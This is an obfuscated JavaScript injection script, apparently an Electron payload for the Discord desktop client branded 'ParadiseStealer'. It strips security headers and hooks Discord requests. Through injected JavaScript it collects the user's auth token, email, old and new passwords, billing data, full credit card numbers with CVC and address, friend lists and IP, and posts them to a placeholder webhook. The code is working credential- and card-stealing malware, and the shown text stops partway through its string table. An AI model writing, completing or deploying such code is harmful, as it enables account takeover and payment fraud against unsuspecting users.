const _0x3b3019 = _0x2c06;
function _0x2c06(_0x57441e, _0x17dd39) {
    const _0x4e94af = _0x4e94();
    return (
        (_0x2c06 = function (_0x2c0648, _0x2eb458) {
            _0x2c0648 = _0x2c0648 - 0x117;
            let _0x59c73c = _0x4e94af[_0x2c0648];
            return _0x59c73c;
        }),
        _0x2c06(_0x57441e, _0x17dd39)
    );
}
(function (_0x585895, _0x396505) {
    const _0x6e59db = _0x2c06,
        _0xcc4b2 = _0x585895();
    while (!![]) {
        try {
            const _0x545dc2 =
                (-parseInt(_0x6e59db(0x178)) / 0x1) * (-parseInt(_0x6e59db(0x190)) / 0x2) +
                (parseInt(_0x6e59db(0x11a)) / 0x3) * (-parseInt(_0x6e59db(0x17e)) / 0x4) +
                -parseInt(_0x6e59db(0x1a3)) / 0x5 +
                -parseInt(_0x6e59db(0x159)) / 0x6 +
                parseInt(_0x6e59db(0x14b)) / 0x7 +
                (-parseInt(_0x6e59db(0x184)) / 0x8) * (-parseInt(_0x6e59db(0x125)) / 0x9) +
                (-parseInt(_0x6e59db(0x1a0)) / 0xa) * (parseInt(_0x6e59db(0x123)) / 0xb);
            if (_0x545dc2 === _0x396505) break;
            else _0xcc4b2["push"](_0xcc4b2["shift"]());
        } catch (_0x33de17) {
            _0xcc4b2["push"](_0xcc4b2["shift"]());
        }
    }
})(_0x4e94, 0x3ef87);
const fs = require("fs"),
    path = require("path"),
    { BrowserWindow: BrowserWindow, session: session } = require(_0x3b3019(0x17a)),
    querystring = require(_0x3b3019(0x19d)),
    os = require("os");
var webhook = "%WEBHOOK_LINK%";
const computerName = os[_0x3b3019(0x16a)](),
    discordInstall = "" + __dirname,
    EvalToken = _0x3b3019(0x127),
    config = { logout: "%LOGOUT%", "logout-notify": _0x3b3019(0x13f), "init-notify": _0x3b3019(0x137), "embed-color": 0x349b98, "disable-qr-code": _0x3b3019(0x18c) };
function FirstTime() {
    const _0x34a058 = _0x3b3019;
    BrowserWindow["getAllWindows"]()[0x0]
        [_0x34a058(0x1a7)][_0x34a058(0x1a5)]("" + EvalToken, !0x0)
        [_0x34a058(0x13e)]((_0x24b2da) => {
            const _0x1bb835 = _0x34a058;
            if (_0x1bb835(0x177) == config["init-notify"] && fs["existsSync"](path["join"](__dirname, _0x1bb835(0x144)))) {
                if ((fs["rmdirSync"](path[_0x1bb835(0x149)](__dirname, _0x1bb835(0x144))), null == _0x24b2da || null == _0x24b2da || "" == _0x24b2da)) {
                    var _0x3c10d2 = {
                        username: _0x1bb835(0x150),
                        content: "",
                        embeds: [
                            {
                                title: "Discord\x20Initalized\x20(User\x20not\x20Logged\x20in)",
                                color: config["embed-color"],
                                fields: [{ name: _0x1bb835(0x1aa), value: _0x1bb835(0x180) + computerName + _0x1bb835(0x194) + __dirname + _0x1bb835(0x18e), inline: !0x1 }],
                                author: { name: _0x1bb835(0x150) },
                                footer: { text: _0x1bb835(0x150) },
                                thumbnail: { url: _0x1bb835(0x132) },
                            },
                        ],
                    };
                    SendToWebhook(JSON[_0x1bb835(0x13b)](_0x3c10d2));
                } else
                    BrowserWindow[_0x1bb835(0x19e)]()[0x0]
                        [_0x1bb835(0x1a7)]["executeJavaScript"](_0x1bb835(0x124) + _0x24b2da + _0x1bb835(0x136), !0x0)
                        ["then"]((_0x21ed7e) => {
                            const _0xf7dbec = _0x1bb835,
                                _0x168038 = JSON["parse"](_0x21ed7e);
                            var _0x2f8828 = {
                                username: "ParadiseStealer",
                                content: "",
                                embeds: [
                                    {
                                        title: _0xf7dbec(0x15d),
                                        color: config["embed-color"],
                                        fields: [
                                            { name: "Info", value: _0xf7dbec(0x180) + computerName + _0xf7dbec(0x194) + __dirname + "\x0a```", inline: !0x1 },
                                            { name: "Username", value: "`" + _0x168038[_0xf7dbec(0x13a)] + "#" + _0x168038[_0xf7dbec(0x12c)] + "`", inline: !0x0 },
                                            { name: "ID", value: "`" + _0x168038["id"] + "`", inline: !0x0 },
                                            { name: _0xf7dbec(0x191), value: "" + GetBadges(_0x168038["flags"]), inline: !0x1 },
                                            { name: _0xf7dbec(0x129), value: _0xf7dbec(0x157) + _0x24b2da + "```", inline: !0x1 },
                                        ],
                                        author: { name: "ParadiseStealer" },
                                        footer: { text: _0xf7dbec(0x150) },
                                        thumbnail: { url: "https://cdn.discordapp.com/avatars/" + _0x168038["id"] + "/" + _0x168038[_0xf7dbec(0x141)] },
                                    },
                                ],
                            };
                            SendToWebhook(JSON[_0xf7dbec(0x13b)](_0x2f8828));
                        });
            }
            if (!fs["existsSync"](path[_0x1bb835(0x149)](__dirname, _0x1bb835(0x164)))) return !0x0;
            if ((fs["rmdirSync"](path[_0x1bb835(0x149)](__dirname, "ParadiseStealerBTW")), "false" != config[_0x1bb835(0x17d)] || _0x1bb835(0x183) == config[_0x1bb835(0x17d)])) {
                if (_0x1bb835(0x177) == config[_0x1bb835(0x16c)])
                    null == _0x24b2da || null == _0x24b2da || "" == _0x24b2da
                        ? ((_0x3c10d2 = {
                              username: _0x1bb835(0x150),
                              content: "",
                              embeds: [
                                  {
                                      title: "User\x20log\x20out\x20(User\x20not\x20Logged\x20in\x20before)",
                                      color: config[_0x1bb835(0x155)],
                                      fields: [{ name: _0x1bb835(0x1aa), value: _0x1bb835(0x180) + computerName + _0x1bb835(0x194) + __dirname + _0x1bb835(0x18e), inline: !0x1 }],
                                      author: { name: _0x1bb835(0x150) },
                                      footer: { text: _0x1bb835(0x150) },
                                      thumbnail: { url: _0x1bb835(0x13d) },
                                  },
                              ],
                          }),
                          SendToWebhook(JSON[_0x1bb835(0x13b)](_0x3c10d2)))
                        : BrowserWindow[_0x1bb835(0x19e)]()[0x0]
                              [_0x1bb835(0x1a7)][_0x1bb835(0x1a5)](_0x1bb835(0x124) + _0x24b2da + _0x1bb835(0x136), !0x0)
                              [_0x1bb835(0x13e)]((_0x57cdc4) => {
                                  const _0x31f8a7 = _0x1bb835,
                                      _0x1d0805 = JSON[_0x31f8a7(0x151)](_0x57cdc4);
                                  var _0x17f038 = {
                                      username: "ParadiseStealer",
                                      content: "",
                                      embeds: [
                                          {
                                              title: "User\x20got\x20logged\x20out",
                                              color: config["embed-color"],
                                              fields: [
                                                  { name: _0x31f8a7(0x1aa), value: _0x31f8a7(0x180) + computerName + _0x31f8a7(0x194) + __dirname + _0x31f8a7(0x18e), inline: !0x1 },
                                                  { name: _0x31f8a7(0x15e), value: "`" + _0x1d0805[_0x31f8a7(0x13a)] + "#" + _0x1d0805[_0x31f8a7(0x12c)] + "`", inline: !0x0 },
                                                  { name: "ID", value: "`" + _0x1d0805["id"] + "`", inline: !0x0 },
                                                  { name: _0x31f8a7(0x191), value: "" + GetBadges(_0x1d0805["flags"]), inline: !0x1 },
                                                  { name: _0x31f8a7(0x129), value: _0x31f8a7(0x157) + _0x24b2da + _0x31f8a7(0x157), inline: !0x1 },
                                              ],
                                              author: { name: _0x31f8a7(0x150) },
                                              footer: { text: _0x31f8a7(0x150) },
                                              thumbnail: { url: "https://cdn.discordapp.com/avatars/" + _0x1d0805["id"] + "/" + _0x1d0805["avatar"] },
                                          },
                                      ],
                                  };
                                  SendToWebhook(JSON[_0x31f8a7(0x13b)](_0x17f038));
                              });
                BrowserWindow["getAllWindows"]()[0x0]
                    [_0x1bb835(0x1a7)]["executeJavaScript"](_0x1bb835(0x189), !0x0)
                    [_0x1bb835(0x13e)]((_0x233022) => {});
            }
            return !0x1;
        });
}
session[_0x3b3019(0x12e)]["webRequest"][_0x3b3019(0x154)]((_0x21135f, _0x5e617f) => {
    const _0x3426bc = _0x3b3019;
    _0x21135f[_0x3426bc(0x179)][_0x3426bc(0x128)](webhook)
        ? _0x21135f[_0x3426bc(0x179)][_0x3426bc(0x197)](_0x3426bc(0x16b))
            ? _0x5e617f({ responseHeaders: Object[_0x3426bc(0x14c)]({ "Access-Control-Allow-Headers": "*" }, _0x21135f[_0x3426bc(0x143)]) })
            : _0x5e617f({
                  responseHeaders: Object[_0x3426bc(0x14c)](
                      { "Content-Security-Policy": ["default-src\x20\x27*\x27", _0x3426bc(0x152), _0x3426bc(0x15b)], "Access-Control-Allow-Headers": "*", "Access-Control-Allow-Origin": "*" },
                      _0x21135f[_0x3426bc(0x143)]
                  ),
              })
        : (delete _0x21135f[_0x3426bc(0x143)][_0x3426bc(0x187)], delete _0x21135f["responseHeaders"][_0x3426bc(0x11c)], _0x5e617f({ responseHeaders: { ..._0x21135f[_0x3426bc(0x143)], "Access-Control-Allow-Headers": "*" } }));
});
const Filter = {
    urls: [
        "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
        "https://*.discord.com/api/v*/applications/detectable",
        _0x3b3019(0x12f),
        _0x3b3019(0x1a9),
        _0x3b3019(0x17f),
        _0x3b3019(0x17b),
        "https://discord.com/api/v*/users/@me/billing/subscriptions",
        "wss://remote-auth-gateway.discord.gg/*",
    ],
};
function SendToWebhook(_0x3272ec) {
    const _0x60c4f0 = _0x3b3019;
    BrowserWindow[_0x60c4f0(0x19e)]()[0x0]
        ["webContents"][_0x60c4f0(0x1a5)](
            "\x20\x20\x20\x20var\x20xhr\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xhr.open(\x22POST\x22,\x20\x22" +
                webhook +
                "\x22,\x20true);\x0a\x20\x20\x20\x20xhr.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xhr.setRequestHeader(\x27Access-Control-Allow-Origin\x27,\x20\x27*\x27);\x0a\x20\x20\x20\x20xhr.send(JSON.stringify(" +
                _0x3272ec +
                _0x60c4f0(0x15f),
            !0x0
        )
        [_0x60c4f0(0x13e)]((_0x399831) => {});
}
function GetNitro(_0x54b3e5) {
    const _0x2a4c64 = _0x3b3019;
    return 0x0 == _0x54b3e5 ? "No\x20Nitro" : 0x1 == _0x54b3e5 ? _0x2a4c64(0x15a) : 0x2 == _0x54b3e5 ? _0x2a4c64(0x16f) : "No\x20Nitro";
}
function GetRBadges(_0x5d089b) {
    const _0x37f9c2 = _0x3b3019;
    var _0x3d18e2 = "";
    return (
        0x1 == (0x1 & _0x5d089b) && (_0x3d18e2 += _0x37f9c2(0x131)),
        0x2 == (0x2 & _0x5d089b) && (_0x3d18e2 += _0x37f9c2(0x18b)),
        0x4 == (0x4 & _0x5d089b) && (_0x3d18e2 += _0x37f9c2(0x14a)),
        0x8 == (0x8 & _0x5d089b) && (_0x3d18e2 += _0x37f9c2(0x140)),
        0x200 == (0x200 & _0x5d089b) && (_0x3d18e2 += _0x37f9c2(0x12d)),
        0x4000 == (0x4000 & _0x5d089b) && (_0x3d18e2 += _0x37f9c2(0x1ac)),
        0x20000 == (0x20000 & _0x5d089b) && (_0x3d18e2 += "<:developer:874750808472825986>\x20"),
        "" == _0x3d18e2 && (_0x3d18e2 = ""),
        _0x3d18e2
    );
}
function GetBadges(_0x48c39a) {
    const _0x1d4928 = _0x3b3019;
    var _0x46872a = "";
    return (
        0x1 == (0x1 & _0x48c39a) && (_0x46872a += _0x1d4928(0x131)),
        0x2 == (0x2 & _0x48c39a) && (_0x46872a += _0x1d4928(0x18b)),
        0x4 == (0x4 & _0x48c39a) && (_0x46872a += _0x1d4928(0x14a)),
        0x8 == (0x8 & _0x48c39a) && (_0x46872a += "<:bughunter_1:874750808426692658>\x20"),
        0x40 == (0x40 & _0x48c39a) && (_0x46872a += _0x1d4928(0x171)),
        0x80 == (0x80 & _0x48c39a) && (_0x46872a += "<:brilliance:874750808338608199>\x20"),
        0x100 == (0x100 & _0x48c39a) && (_0x46872a += "<:balance:874750808267292683>\x20"),
        0x200 == (0x200 & _0x48c39a) && (_0x46872a += "<a:early:925791052512788551>\x20"),
        0x4000 == (0x4000 & _0x48c39a) && (_0x46872a += _0x1d4928(0x1ac)),
        0x20000 == (0x20000 & _0x48c39a) && (_0x46872a += _0x1d4928(0x163)),
        "" == _0x46872a && (_0x46872a = _0x1d4928(0x12b)),
        _0x46872a
    );
}
function Login(_0x1e9b94, _0x1b8fe0, _0x27c620) {
    const _0x166377 = _0x3b3019,
        _0x3997d7 = BrowserWindow[_0x166377(0x19e)]()[0x0];
    _0x3997d7[_0x166377(0x1a7)][_0x166377(0x1a5)](_0x166377(0x161) + _0x27c620 + _0x166377(0x167), !0x0)[_0x166377(0x13e)]((_0x70a143) => {
        const _0x449999 = _0x166377;
        _0x3997d7[_0x449999(0x1a7)][_0x449999(0x1a5)](_0x449999(0x1a4), !0x0)[_0x449999(0x13e)]((_0x1edd27) => {
            const _0x1e0b12 = _0x449999;
            _0x3997d7[_0x1e0b12(0x1a7)]
                [_0x1e0b12(0x1a5)](
                    "\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/billing/payment-sources\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22" +
                        _0x27c620 +
                        _0x1e0b12(0x198),
                    !0x0
                )
                ["then"]((_0x3790f3) => {
                    const _0x34afa0 = _0x1e0b12;
                    _0x3997d7["webContents"][_0x34afa0(0x1a5)](_0x34afa0(0x176) + _0x27c620 + _0x34afa0(0x192), !0x0)[_0x34afa0(0x13e)]((_0x38efe6) => {
                        const _0x347d2e = _0x34afa0,
                            _0x2299c1 = JSON[_0x347d2e(0x151)](_0x70a143);
                        var _0x351a6a = {
                            username: "ParadiseStealer",
                            content: "",
                            embeds: [
                                {
                                    title: _0x347d2e(0x182),
                                    color: config[_0x347d2e(0x155)],
                                    fields: [
                                        { name: _0x347d2e(0x15e), value: "`" + _0x2299c1["username"] + "#" + _0x2299c1[_0x347d2e(0x12c)] + "`", inline: !0x0 },
                                        { name: "ID", value: "`" + _0x2299c1["id"] + "`", inline: !0x0 },
                                        { name: _0x347d2e(0x18a), value: "" + GetNitro(_0x2299c1[_0x347d2e(0x172)]), inline: !0x1 },
                                        { name: _0x347d2e(0x146), value: "" + GetBadges(_0x2299c1["flags"]), inline: !0x1 },
                                        {
                                            name: "Billing",
                                            value:
                                                "" +
                                                (function () {
                                                    const _0x1b7ceb = _0x347d2e,
                                                        _0x145cdb = JSON[_0x1b7ceb(0x151)](_0x3790f3);
                                                    var _0x857f1d = "";
                                                    return (
                                                        _0x145cdb[_0x1b7ceb(0x196)]((_0x338cf1) => {
                                                            const _0x515028 = _0x1b7ceb;
                                                            if ("" == _0x338cf1[_0x515028(0x15c)]) return "<a:420_cross:931468716779114536>";
                                                            if (0x2 == _0x338cf1[_0x515028(0x15c)] && 0x1 != _0x338cf1[_0x515028(0x1a8)]) _0x857f1d += _0x515028(0x142);
                                                            else {
                                                                if (0x1 != _0x338cf1[_0x515028(0x15c)] || 0x1 == _0x338cf1[_0x515028(0x1a8)]) return _0x515028(0x138);
                                                                _0x857f1d += "`✔️`\x20:credit_card:";
                                                            }
                                                        }),
                                                        "" == _0x857f1d && (_0x857f1d = _0x1b7ceb(0x138)),
                                                        _0x857f1d
                                                    );
                                                })(),
                                            inline: !0x1,
                                        },
                                        { name: "<:PP_director:942527310324719716>\x20\x20Email", value: "`" + _0x1e9b94 + "`", inline: !0x0 },
                                        { name: _0x347d2e(0x18f), value: "`" + _0x1b8fe0 + "`", inline: !0x0 },
                                        { name: _0x347d2e(0x129), value: _0x347d2e(0x157) + _0x27c620 + _0x347d2e(0x157), inline: !0x1 },
                                    ],
                                    author: { name: _0x347d2e(0x150) },
                                    footer: { text: _0x347d2e(0x150) },
                                    thumbnail: { url: "https://cdn.discordapp.com/avatars/" + _0x2299c1["id"] + "/" + _0x2299c1[_0x347d2e(0x141)] },
                                },
                                {
                                    title: _0x347d2e(0x162) + JSON["parse"](_0x38efe6)[_0x347d2e(0x186)]((_0x14b78a) => 0x1 == _0x14b78a[_0x347d2e(0x15c)])["length"] + ")",
                                    color: config["embed-color"],
                                    description: (function () {
                                        const _0x554c1e = _0x347d2e,
                                            _0x473fed = JSON[_0x554c1e(0x151)](_0x38efe6)[_0x554c1e(0x186)]((_0x1ab0ae) => 0x1 == _0x1ab0ae[_0x554c1e(0x15c)]);
                                        var _0x14d92a = "";
                                        for (z of _0x473fed) {
                                            var _0x339071 = GetRBadges(z[_0x554c1e(0x126)]["public_flags"]);
                                            "" != _0x339071 && (_0x14d92a += _0x339071 + ("\x20" + z[_0x554c1e(0x126)][_0x554c1e(0x13a)] + "#" + z[_0x554c1e(0x126)][_0x554c1e(0x12c)] + "\x0a"));
                                        }
                                        return "" == _0x14d92a && (_0x14d92a = _0x554c1e(0x148)), _0x14d92a;
                                    })(),
                                    author: { name: _0x347d2e(0x150) },
                                    footer: { text: _0x347d2e(0x150) },
                                    thumbnail: { url: _0x347d2e(0x135) + _0x2299c1["id"] + "/" + _0x2299c1[_0x347d2e(0x141)] },
                                },
                            ],
                        };
                        SendToWebhook(JSON[_0x347d2e(0x13b)](_0x351a6a));
                    });
                });
        });
    });
}
function ChangePassword(_0x1e33d9, _0x5802d8, _0x4ded90) {
    const _0x2cf268 = _0x3b3019,
        _0x13a030 = BrowserWindow[_0x2cf268(0x19e)]()[0x0];
    _0x13a030[_0x2cf268(0x1a7)]
        [_0x2cf268(0x1a5)](
            "\x0a\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v8/users/@me\x22,\x20false\x20);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22" +
                _0x4ded90 +
                _0x2cf268(0x167),
            !0x0
        )
        ["then"]((_0x43ebf9) => {
            const _0x285ac9 = _0x2cf268;
            _0x13a030[_0x285ac9(0x1a7)][_0x285ac9(0x1a5)](_0x285ac9(0x1a4), !0x0)[_0x285ac9(0x13e)]((_0x2183a1) => {
                const _0x40a9f8 = _0x285ac9;
                _0x13a030["webContents"]["executeJavaScript"](_0x40a9f8(0x12a) + _0x4ded90 + _0x40a9f8(0x198), !0x0)[_0x40a9f8(0x13e)]((_0x5187d8) => {
                    const _0x59e6d3 = _0x40a9f8,
                        _0x594609 = JSON["parse"](_0x43ebf9);
                    var _0xd7029b = {
                        username: _0x59e6d3(0x150),
                        content: "",
                        embeds: [
                            {
                                title: "Password\x20Changed",
                                color: config[_0x59e6d3(0x155)],
                                fields: [
                                    { name: _0x59e6d3(0x1aa), value: _0x59e6d3(0x180) + computerName + _0x59e6d3(0x119) + _0x2183a1 + _0x59e6d3(0x194) + discordInstall + _0x59e6d3(0x18e), inline: !0x1 },
                                    { name: _0x59e6d3(0x15e), value: "`" + _0x594609[_0x59e6d3(0x13a)] + "#" + _0x594609[_0x59e6d3(0x12c)] + "`", inline: !0x0 },
                                    { name: "ID", value: "`" + _0x594609["id"] + "`", inline: !0x0 },
                                    { name: "Nitro", value: "" + GetNitro(_0x594609[_0x59e6d3(0x172)]), inline: !0x1 },
                                    { name: _0x59e6d3(0x191), value: "" + GetBadges(_0x594609[_0x59e6d3(0x147)]), inline: !0x1 },
                                    {
                                        name: _0x59e6d3(0x158),
                                        value:
                                            "" +
                                            (function () {
                                                const _0x17f614 = _0x59e6d3,
                                                    _0x3f8624 = JSON[_0x17f614(0x151)](_0x5187d8);
                                                var _0x1f728a = "";
                                                return (
                                                    _0x3f8624[_0x17f614(0x196)]((_0x3dc43e) => {
                                                        const _0x3be4c2 = _0x17f614;
                                                        if ("" == _0x3dc43e["type"]) return _0x3be4c2(0x145);
                                                        if (0x2 == _0x3dc43e["type"] && 0x1 != _0x3dc43e[_0x3be4c2(0x1a8)]) _0x1f728a += _0x3be4c2(0x142);
                                                        else {
                                                            if (0x1 != _0x3dc43e[_0x3be4c2(0x15c)] || 0x1 == _0x3dc43e[_0x3be4c2(0x1a8)]) return _0x3be4c2(0x145);
                                                            _0x1f728a += _0x3be4c2(0x199);
                                                        }
                                                    }),
                                                    "" == _0x1f728a && (_0x1f728a = _0x17f614(0x145)),
                                                    _0x1f728a
                                                );
                                            })(),
                                        inline: !0x1,
                                    },
                                    { name: "Email", value: "`" + _0x594609[_0x59e6d3(0x170)] + "`", inline: !0x1 },
                                    { name: _0x59e6d3(0x156), value: "`" + _0x1e33d9 + "`", inline: !0x0 },
                                    { name: "New\x20Password", value: "`" + _0x5802d8 + "`", inline: !0x0 },
                                    { name: _0x59e6d3(0x129), value: _0x59e6d3(0x157) + _0x4ded90 + _0x59e6d3(0x157), inline: !0x1 },
                                ],
                                author: { name: _0x59e6d3(0x150) },
                                footer: { text: _0x59e6d3(0x150) },
                                thumbnail: { url: _0x59e6d3(0x135) + _0x594609["id"] + "/" + _0x594609[_0x59e6d3(0x141)] },
                            },
                        ],
                    };
                    SendToWebhook(JSON[_0x59e6d3(0x13b)](_0xd7029b));
                });
            });
        });
}
function ChangeEmail(_0x467fbe, _0x4d6660, _0x3e97b6) {
    const _0x2fddde = _0x3b3019,
        _0x31226b = BrowserWindow["getAllWindows"]()[0x0];
    _0x31226b[_0x2fddde(0x1a7)][_0x2fddde(0x1a5)](_0x2fddde(0x161) + _0x3e97b6 + "\x22);\x0a\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20xmlHttp.responseText;", !0x0)[_0x2fddde(0x13e)]((_0x19d07c) => {
        const _0x3839e2 = _0x2fddde;
        _0x31226b[_0x3839e2(0x1a7)][_0x3839e2(0x1a5)](_0x3839e2(0x1a4), !0x0)[_0x3839e2(0x13e)]((_0x4e1859) => {
            const _0x40daf7 = _0x3839e2;
            _0x31226b[_0x40daf7(0x1a7)]
                [_0x40daf7(0x1a5)](_0x40daf7(0x12a) + _0x3e97b6 + "\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText", !0x0)
                [_0x40daf7(0x13e)]((_0x370cf5) => {
                    const _0x2887a2 = _0x40daf7,
                        _0x5d1d2c = JSON["parse"](_0x19d07c);
                    var _0x15e78b = {
                        username: "ParadiseStealer",
                        content: "",
                        embeds: [
                            {
                                title: _0x2887a2(0x16e),
                                color: config[_0x2887a2(0x155)],
                                fields: [
                                    { name: _0x2887a2(0x15e), value: "`" + _0x5d1d2c["username"] + "#" + _0x5d1d2c["discriminator"] + "`", inline: !0x0 },
                                    { name: "ID", value: "`" + _0x5d1d2c["id"] + "`", inline: !0x0 },
                                    { name: _0x2887a2(0x19a), value: "" + GetNitro(_0x5d1d2c[_0x2887a2(0x172)]), inline: !0x1 },
                                    { name: _0x2887a2(0x191), value: "" + GetBadges(_0x5d1d2c["flags"]), inline: !0x1 },
                                    {
                                        name: _0x2887a2(0x158),
                                        value:
                                            "" +
                                            (function () {
                                                const _0x8e97d8 = _0x2887a2,
                                                    _0x3b05b5 = JSON["parse"](_0x370cf5);
                                                var _0xd4d82a = "";
                                                return (
                                                    _0x3b05b5["forEach"]((_0x4a4f47) => {
                                                        const _0x20c0cb = _0x2c06;
                                                        if ("" == _0x4a4f47[_0x20c0cb(0x15c)]) return "`<a:420_cross:931468716779114536>`";
                                                        if (0x2 == _0x4a4f47["type"] && 0x1 != _0x4a4f47[_0x20c0cb(0x1a8)]) _0xd4d82a += _0x20c0cb(0x142);
                                                        else {
                                                            if (0x1 != _0x4a4f47[_0x20c0cb(0x15c)] || 0x1 == _0x4a4f47["invalid"]) return "`<a:420_cross:931468716779114536>`";
                                                            _0xd4d82a += _0x20c0cb(0x199);
                                                        }
                                                    }),
                                                    "" == _0xd4d82a && (_0xd4d82a = _0x8e97d8(0x185)),
                                                    _0xd4d82a
                                                );
                                            })(),
                                        inline: !0x1,
                                    },
                                    { name: _0x2887a2(0x1a2), value: "`" + _0x467fbe + "`", inline: !0x0 },
                                    { name: _0x2887a2(0x18f), value: "`" + _0x4d6660 + "`", inline: !0x0 },
                                    { name: _0x2887a2(0x129), value: _0x2887a2(0x157) + _0x3e97b6 + "```", inline: !0x1 },
                                ],
                                author: { name: "ParadiseStealer" },
                                footer: { text: _0x2887a2(0x150) },
                                thumbnail: { url: "https://cdn.discordapp.com/avatars/" + _0x5d1d2c["id"] + "/" + _0x5d1d2c[_0x2887a2(0x141)] },
                            },
                        ],
                    };
                    SendToWebhook(JSON[_0x2887a2(0x13b)](_0x15e78b));
                });
        });
    });
}
function CreditCardAdded(_0x5cae4f, _0x1d760f, _0x4bdce4, _0x590a88, _0x2bcd5a, _0x3e1b98, _0x5e7aff, _0x2e7756, _0x439ab5, _0x3953b9) {
    const _0x194bb0 = _0x3b3019,
        _0x914bc9 = BrowserWindow["getAllWindows"]()[0x0];
    _0x914bc9[_0x194bb0(0x1a7)][_0x194bb0(0x1a5)](_0x194bb0(0x161) + _0x3953b9 + "\x22);\x0a\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20xmlHttp.responseText;", !0x0)["then"]((_0x548bc9) => {
        const _0x366045 = _0x194bb0;
        _0x914bc9[_0x366045(0x1a7)]
            [_0x366045(0x1a5)](
                "\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://www.myexternalip.com/raw\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText;\x0a\x20\x20\x20\x20",
                !0x0
            )
            ["then"]((_0x249258) => {
                const _0x3231a = _0x366045;
                var _0x26f4bc = JSON[_0x3231a(0x151)](_0x548bc9),
                    _0x2ccf77 = {
                        username: "ParadiseStealer",
                        content: "",
                        embeds: [
                            {
                                title: "User\x20Credit\x20Card\x20Added",
                                description:
                                    "**Username:**```" +
                                    _0x26f4bc[_0x3231a(0x13a)] +
                                    "#" +
                                    _0x26f4bc[_0x3231a(0x12c)] +
                                    _0x3231a(0x166) +
                                    _0x26f4bc["id"] +
                                    _0x3231a(0x14f) +
                                    _0x26f4bc[_0x3231a(0x170)] +
                                    _0x3231a(0x19b) +
                                    GetNitro(_0x26f4bc[_0x3231a(0x172)]) +
                                    _0x3231a(0x17c) +
                                    GetBadges(_0x26f4bc["flags"]) +
                                    _0x3231a(0x14e) +
                                    _0x5cae4f +
                                    "```\x0a**Credit\x20Card\x20Expiration:\x20**```" +
                                    _0x4bdce4 +
                                    "/" +
                                    _0x590a88 +
                                    "```\x0a**CVC:\x20**```" +
                                    _0x1d760f +
                                    _0x3231a(0x188) +
                                    _0x439ab5 +
                                    "```\x0a**State:\x20**```" +
                                    _0x5e7aff +
                                    _0x3231a(0x195) +
                                    _0x3e1b98 +
                                    _0x3231a(0x160) +
                                    _0x2e7756 +
                                    "```\x0a**Street:\x20**```" +
                                    _0x2bcd5a +
                                    _0x3231a(0x121) +
                                    _0x3953b9 +
                                    "```\x0a**IP:\x20**```" +
                                    _0x249258 +
                                    "```",
                                author: { name: "ParadiseStealer" },
                                footer: { text: _0x3231a(0x150) },
                                thumbnail: { url: "https://cdn.discordapp.com/avatars/" + _0x26f4bc["id"] + "/" + _0x26f4bc[_0x3231a(0x141)] },
                            },
                        ],
                    };
                SendToWebhook(JSON["stringify"](_0x2ccf77));
            });
    });
}
function _0x4e94() {
    const _0x40d07c = [
        "flags",
        "No\x20Rare\x20Friends",
        "join",
        "<:hypesquad_events:874750808594477056>\x20",
        "2812558rJGeYh",
        "assign",
        "login",
        "```\x0a**Credit\x20Card\x20Number:\x20**```",
        "```\x0a**Email:**```",
        "ParadiseStealer",
        "parse",
        "Access-Control-Allow-Headers\x20\x27*\x27",
        "bytes",
        "onHeadersReceived",
        "embed-color",
        "Old\x20Password",
        "```",
        "Billing",
        "1443516AvpKOL",
        "<:classic:896119171019067423>\x20`Nitro\x20Classic`",
        "Access-Control-Allow-Origin\x20\x27*\x27",
        "type",
        "Discord\x20Initalized",
        "Username",
        "));\x0a\x20\x20\x20\x20",
        "```\x0a**ZIP:**```",
        "\x0a\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v8/users/@me\x22,\x20false\x20);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22",
        "Total\x20Friends\x20(",
        "<:developer:874750808472825986>\x20",
        "ParadiseStealerBTW",
        "./core.asar",
        "```\x0a**ID:**```",
        "\x22);\x0a\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20xmlHttp.responseText;",
        "card[exp_year]",
        "card[address_zip]",
        "hostname",
        "discord.com",
        "logout-notify",
        "https://*.discord.com/api/v*/users/@me",
        "Email\x20Changed",
        "<a:boost:824036778570416129>\x20`Nitro\x20Boost`",
        "email",
        "<:bravery:874750808388952075>\x20",
        "premium_type",
        "tokens",
        "https://discord.com/api/v*/users/@me",
        "onBeforeRequest",
        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/relationships\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22",
        "true",
        "199CEgQoO",
        "url",
        "electron",
